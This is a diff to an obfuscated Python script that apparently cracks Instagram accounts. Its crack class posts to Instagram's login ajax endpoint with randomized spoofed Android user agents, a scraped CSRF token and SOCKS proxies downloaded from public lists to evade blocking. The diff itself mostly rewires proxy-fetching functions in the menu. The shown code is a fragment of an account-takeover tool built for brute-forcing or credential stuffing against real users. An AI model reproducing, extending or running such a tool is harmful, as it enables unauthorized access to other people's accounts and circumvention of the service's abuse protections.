@@ -153,7 +153,7 @@ def ___menu___():
     elif ___pilih in ['8','08']:
         ___email___()
     elif ___pilih in ['9','09']:
-        ___proxy___()
+        ___proxy___(),___proxy3___()
     elif ___pilih in ['0','00']:
         try:
             print(f"{T}║ [{Z}1{T}]{H} Total Ok")
@@ -353,8 +353,8 @@ def ___proxy___():
         ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
         open('Data/proxy.txt', 'w').write(___roz)
     ___crack___()
-# Proxy2
-def ___proxy2___():
+# Proxy3
+def ___proxy3___():
     try:
         ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
         open('Data/proxy.txt', 'w').write(___roz)
@@ -423,7 +423,6 @@ class ___crack___:
                 ___login = ('https://www.instagram.com/accounts/login/ajax/')
                 ___useragent = random.choice('Mozilla/5.0 (Linux; Android 5.0; Lenovo K50-t5 Build/LRX21M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (21/5.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K50-t5; aio_otfp; mt6752; ru_RU; 99640911',
                                              'Mozilla/5.0 (Linux; Android 9; TA-1024 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.121 Mobile Safari/537.36 Instagram 102.0.0.20.117 Android (28/9; 320dpi; 720x1280; HMD Global/Nokia; TA-1024; ND1; qcom; hu_HU; 163022084)')
-
                 ___ipaddress = requests.get('https://api.ipify.org').text
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
